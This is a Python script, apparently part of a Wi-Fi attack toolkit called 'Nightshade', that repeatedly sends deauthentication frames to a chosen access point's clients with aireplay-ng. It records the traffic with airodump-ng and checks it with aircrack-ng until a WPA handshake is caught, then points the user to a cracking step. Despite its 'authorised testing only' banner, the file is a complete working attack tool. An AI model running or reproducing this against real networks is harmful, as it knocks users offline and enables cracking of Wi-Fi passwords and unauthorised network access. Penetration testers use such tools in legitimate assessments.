#!/usr/bin/env python3
"""Handshake auto-hunt: loop deauth + capture on the selected target
until a handshake lands, then stop and report.

Each round knocks the target's clients off (so they re-authenticate)
and captures what comes back. Captures accumulate in the state
directory and every round is checked with aircrack-ng, so a handshake
from any round is found. The hunt is bounded (8 minutes) and KEY3
stops it -- the runner kills the whole process group, which takes the
loop and every short-lived child with it.

AUTHORISED TESTING ONLY.
"""
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from wifi_tools import (CAPTURES, _set_channel, has_handshake,
                        monitor_interface, run, selected_network)

ROUNDS = 48          # 48 x ~10s rounds = 8 minute budget
DEAUTH_FRAMES = 16
CAPTURE_SECONDS = 8


def hunt():
    print('NIGHTSHADE / HANDSHAKE HUNT\n')
    print('AUTHORISED TESTING ONLY\n')
    interface = monitor_interface()
    if not interface:
        print('Start Monitor mode first'); return
    net = selected_network()
    if not net:
        print('Run Targets first'); return
    channel = str(net.get('channel', ''))
    if not channel.isdigit():
        print('Target channel unknown; rescan with Targets'); return
    _set_channel(interface, channel)
    CAPTURES.mkdir(parents=True, exist_ok=True)
    for old in CAPTURES.glob('hunt-*'):
        try:
            old.unlink()
        except OSError:
            pass
    print(f'Hunting a handshake from {net["essid"]} ({net["bssid"]})')
    print(f'Channel {channel}; deauth {DEAUTH_FRAMES} + capture '
          f'{CAPTURE_SECONDS}s per round, up to {ROUNDS} rounds.')
    print('KEY3 stops the hunt.\n')

    deadline = time.time() + ROUNDS * 10
    rounds = 0
    while time.time() < deadline:
        rounds += 1
        # Knock clients off so they re-handshake with the target.
        run(['sudo', '-n', 'aireplay-ng', '--deauth', str(DEAUTH_FRAMES),
             '-a', net['bssid'], interface], 25)
        # Catch what comes back. A unique prefix per round keeps every
        # round's frames on disk; a fixed name would be overwritten.
        prefix = CAPTURES / f'hunt-{int(time.time())}'
        run(['sudo', '-n', 'timeout', str(CAPTURE_SECONDS + 2),
             'airodump-ng', '-c', channel, '--bssid', net['bssid'],
             '-w', str(prefix), '--output-format', 'pcap', interface],
            CAPTURE_SECONDS + 8)
        caps = sorted(CAPTURES.glob('hunt-*.pcap'))
        if caps:
            rc, out = run(['aircrack-ng'] + [str(c) for c in caps], 30,
                          stdin=subprocess.DEVNULL)
            if has_handshake(out):
                print(f'\nHandshake captured -> {caps[-1].name}')
                print(f'{rounds} round{"s" if rounds != 1 else ""}; '
                      f'crack it with Crack handshake.')
                return
        left = int(max(0, deadline - time.time()))
        print(f'Round {rounds}: no handshake yet ({left}s left)')
    print('\nNo handshake within the hunt window; retry or check the '
          'target has clients.')


if __name__ == '__main__':
    hunt()
